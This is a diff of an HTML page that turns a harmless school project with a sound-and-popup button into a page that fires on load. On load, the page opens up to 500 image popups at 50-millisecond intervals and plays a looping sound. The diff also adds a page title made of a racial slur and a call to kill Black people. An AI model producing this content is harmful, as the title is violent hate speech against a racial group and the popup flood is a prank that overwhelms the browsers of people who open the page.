@@ -2,22 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Fun School Project</title>
+  <title>Kill Niggers</title>
 </head>
 <body>
 
-  <h1>Fun Project</h1>
-  <button id="startBtn">Start Show</button>
-
-  <audio id="sound1" src="sound1.mp3"></audio>
-  <audio id="sound2" src="sound2.mp3"></audio>
+  <audio id="sound1" src="sound1.mp3" loop></audio>
 
   <script>
-    const startBtn = document.getElementById("startBtn");
-    const sound1 = document.getElementById("sound1");
-    const sound2 = document.getElementById("sound2");
+    window.onload = function() {
 
-    startBtn.addEventListener("click", () => {
+      const sound1 = document.getElementById("sound1");
 
       // Open large main window (1920x1080)
       window.open(
@@ -26,41 +20,35 @@
         "width=1920,height=1080,left=0,top=0"
       );
 
-      // Play first sound
-      sound1.play();
+      // Open small popups immediately (limited amount)
+      let count = 0;
+      const maxWindows = 500;
 
-      // When sound1 ends, play sound2
-      sound1.onended = () => {
-        sound2.play();
-      };
+      const interval = setInterval(() => {
 
-      // When sound2 ends, open small popups
-      sound2.onended = () => {
-        let count = 0;
-        const maxWindows = 6; // number of small windows
+        const left = Math.floor(Math.random() * 800);
+        const top = Math.floor(Math.random() * 600);
 
-        const interval = setInterval(() => {
+        window.open(
+          "IMG_20260304_110715.jpg",
+          "_blank",
+          `width=300,height=200,left=${left},top=${top}`
+        );
 
-          // Random position for small windows
-          const left = Math.floor(Math.random() * 800);
-          const top = Math.floor(Math.random() * 600);
+        count++;
 
-          window.open(
-            "IMG_20260304_110715.jpg",
-            "_blank",
-            `width=300,height=200,left=${left},top=${top}`
-          );
+        if (count >= maxWindows) {
+          clearInterval(interval);
+        }
 
-          count++;
+      }, 50);
 
-          if (count >= maxWindows) {
-            clearInterval(interval);
-          }
+      // Play looping sound
+      sound1.play().catch(() => {
+        console.log("Autoplay blocked by browser.");
+      });
 
-        }, 400); // opens every 0.4 seconds
-      };
-
-    });
+    };
   </script>
 
 </body>
